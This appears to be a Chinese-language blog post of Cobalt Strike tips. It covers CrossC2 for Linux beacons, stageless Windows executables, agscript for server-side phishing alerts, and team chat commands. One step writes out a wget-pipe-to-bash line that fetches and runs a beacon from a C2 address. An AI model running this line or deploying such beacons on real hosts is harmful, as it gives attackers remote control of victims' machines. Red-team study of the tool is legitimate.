CobalStrike Tips

前言

Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。

这款神器许多大佬们都已经玩的很6，是渗透测试中不可缺少的利器！

CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能

同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱

上线Linux主机

下载CrossC2

https://github.com/gloxec/CrossC2

前言

CrossC2是CobalStrike的⼀个脚本，CobalStrike直接生成的beacon只适⽤于windows，通过CrossC2可以生成Linux跨平台的beacon

CrossC2支持无文件落地从内存中加载执行 动态库、 可执行文件

注意

现已支持4.1版本，笔者就用4.1做演示吧

配置

1.配置cna文件

第一个是genCrossC2的绝对路径，genCrossC2就是上一步src目录中对应三种系统的载荷；

第二个变量就是你要选择那种载荷，这里我们尝试上线linux主机，所以选genCrossC2.Linux

2.拷贝.cobaltstrike.beacon_keys文件

从服务端拷贝.cobaltstrike.beacon_keys文件到客户端启动目录下

注：这个文件是个隐藏文件

3.Linux客户端启动

4.上传脚本

5.创建监听

注：Cross C2目前只支持HTTPS Beacon，所以在Listenrs中选择HTTPS进行监听

6.上线linux主机

wget -U O -O - http://192.168.175.134:55413/a | bash -s

7.成功上线

Windows Executable(S)

Windows Executable(S)用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需

要阶段性的请求.因此生成的体积比较大. 打内网做横向的时候, 生成Beacon 优先考虑 Windows Executable(S)

服务端上线插件

场景-

当我们钓鱼的时候，我们把cna脚本添加到本地客户端后，如果有机器上线了，这个提醒的请求是从客户端发出的

那么问题来了，如果我要接收通知，是不是就得一直开着客户端连着 teamserver

这样就非常不方便了，而且如果网络有波动，断开了到 teamserver 的连接，就收不到通知了

其实在服务器端有个agscript文件，他就是用来在服务器端运行 cna 文件的，这样就不用一直连着服务器端

给师傅们把插件贴出来吧

用法

./agscript [host] [port] [user] [pass] </path/to/file.cna>
[host]   #服务器的ip 地址

[port]   #cs 的端口号,启动 cs 时有显示

[user]   #用户名,用来运行这个脚本的用户名

[pass]   #启动cs时设置的密码

[path]   #cna文件的路径

四个指令

四个指令

1. /me

这个指令就是标记当前的语句为操作消息

使用语法： 

/me action message

`

2. /msg(重点)

这条指令的作用是私聊

使用语法： 

/msg user_nickname message

x privmsg("neo","Hello")

3./names & /sc

这两条指令的作⽤是⼀样的，功能就是打印出当前所有在线的⽤户。
